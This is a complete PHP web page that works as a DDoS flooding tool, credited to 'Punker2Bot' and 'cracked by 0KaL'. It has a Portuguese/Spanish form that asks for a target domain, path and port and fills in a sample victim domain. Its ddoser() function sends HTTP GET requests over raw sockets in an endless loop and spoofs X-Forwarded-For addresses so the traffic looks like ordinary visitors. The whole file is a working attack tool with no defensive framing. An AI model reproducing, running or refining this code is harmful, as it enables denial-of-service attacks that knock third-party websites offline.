<?php
$dominio = addslashes($_POST['host']);
$ruta = addslashes($_POST['path']);
$port = addslashes($_POST['port']);
$poder = addslashes($_POST['poder']);
$pw = addslashes($_POST['pw']);
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta name="msvalidate.01" content="ECAB4AE09BDECAEDA633439FD8D12D38" />
<meta name="author" content="Punker2Bot (cracked by 0KaL)" />
<title>DDoser attacker by Punker2Bot and cracked by 0KaL</title>
<style>
body { padding: 3px; }

* {
background-color: #1F1F1F;
color: #0EEF57;
font-family: calibri,tahoma,verdana,terminal,serif,lucida,system;
font-size: 18px;
margin: 0; }

input {
width: 440px;
border: solid 1px #00BCFF;
padding: 2px; }

input.accion {
width: 215px;
border: solid 2px #00BCFF;
padding: 3px;
cursor: pointer }

input:hover , input:active { border-color: #FFE900 }

#dinamico {
padding: 3px;
font-size: 13px!important;
height: 300px;
min-height: 300px;
max-height: 300px;
overflow: hidden }
</style>
<script>
function ir_a_bajo() {
var scc = document.getElementById('dinamico');
scc.scrollTop = scc.scrollHeight + scc.offsetHeight;
}
setInterval('ir_a_bajo()',75);
</script>
</head>
<body onload="ir_a_bajo()" id="index">
<form action="" method="post" name="jaja">
<table>
<tr>
<td class="titulo">
Domínio/IP</td> <td><input id="boton" type="text" name="host" value="<?php if ($dominio == "") {
    print 'vitima.com.br';
} else {
    print htmlentities($dominio);
} ?>" size="40px" ></td>
</tr>
<tr>
<td class="titulo">
Arquivo </td> <td> <input id="boton" type="text" name="path" value="<?php if ($ruta == "") {
    print '/';
} else {
    print htmlentities($ruta);
} ?>" size="40px" /> </td>
</tr>
<tr>
<td class="titulo">
Porta </td>
<td>
<select name="port" id="boton">
<option value="80">80 (HTTP)</option>
<option value="443">443 (HTTPS)</option>
<option value="3128">3128 (proxy)</option>
<option value="8080">8080 (proxy)</option>
<option value="1080">1080 (internal proxies)</option>
<option value="2301">2301 (reverse WWW)</option>
</select></td>
</tr>
<tr>
<td class="titulo">
Senha </td>
<td><input id="boton" type="text" disabled name="pw" value="<?php if ($pw == "") {
    print '0KaL';
} else {
    print htmlentities($pw);
} ?>" size="40px" /> </td>
</tr>
<tr>
<td class="titulo">
Preparado? </td> <td>
<input type="submit" value="Atacar agora!" class="accion"> &nbsp; <input type="button" value="Cancelar ataque" class="accion" onclick="window.stop()" /> </td>
</tr>
</table>
</form>
<br />
<div id="dinamico">
<?php
@set_time_limit(0);
$msj = array("<h2>No podes continuar, pw erroneo</h2></div></body></html>", "<h2>Preencha o formulário acima com os dados do alvo.</h2></div></body></html>", "<big><b>Não foi possível estabelecer uma conexão.</b></big><br />
", "0a32e26a417d2c7cfbd333b7feb0a0a8", "2e2234a41122a233cfbd333b9bc30a03");
function ddoser($dominio, $ruta, $port) {
    //hago un random de ips para no ser siempre el mismo vistitante
    $ip_simulada = rand(188, 254) . '.' . rand(1, 254) . '.' . rand(1, 254) . '.' . rand(1, 254);
    //defino y abro socket segun los datos del form
    $socket = fsockopen($dominio, $port, $errno, $errstr, 30);
    // comienzan los datos del header para parecer una persona comun xD
    $header = "GET " . $ruta . " HTTP/1.1
";
    $header.= "Host: " . $dominio . "
";
    $header.= "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; es-ES; rv:1.8.1.16) Gecko/20080702 Firefox/2.0.0.16
";
    $header.= "Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,image/jpg,image/gif,*/*;q=0.5
";
    $header.= "Accept-Language: es-es,es;q=0.8,en-us;q=0.5,en;q=0.3
";
    $header.= "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
";
    $header.= "Keep-Alive: 300
";
    $header.= "Proxy-Connection: keep-alive
";
    $header.= "Referer: http://" . $dominio . $ruta . "
";
    $header.= "Content-Type: application/x-www-form-urlencoded
";
    $header.= "X-Forwarded-For: " . $ip_simulada . "
";
    $header.= "Via: CB-Prx
";
    $header.= "Connection: Close

";
    //envio todo lo recolectado
    $send_header = fwrite($socket, $header);
    //lo muestro en la web
    if ($send_header) {
        print ("Attacking as: <span style='color:#FF0F2F'>" . $ip_simulada . "</span> @ " . htmlentities(str_replace('www.', '', $dominio)) . "" . htmlentities($ruta) . "<br />
");
    } else {
        print ("$msj[2]");
    }
    fclose($socket);
}
if ($msj[3] != (md5(md5($pw)))) {
    echo "DDoS script coded by Punker2Bot and cracked by <a href='http://0kal.t35.com' title='Website' target='_blank'>0KaL</a>.";
}
if ($dominio != "" && $dominio != "www.victima.com") {
    while (1) {
        ddoser($dominio, $ruta, $port);
    }
} else {
    die("$msj[1]");
}
?>
</div>
</body>
</html><? $el_saludo_es = ""; ?>
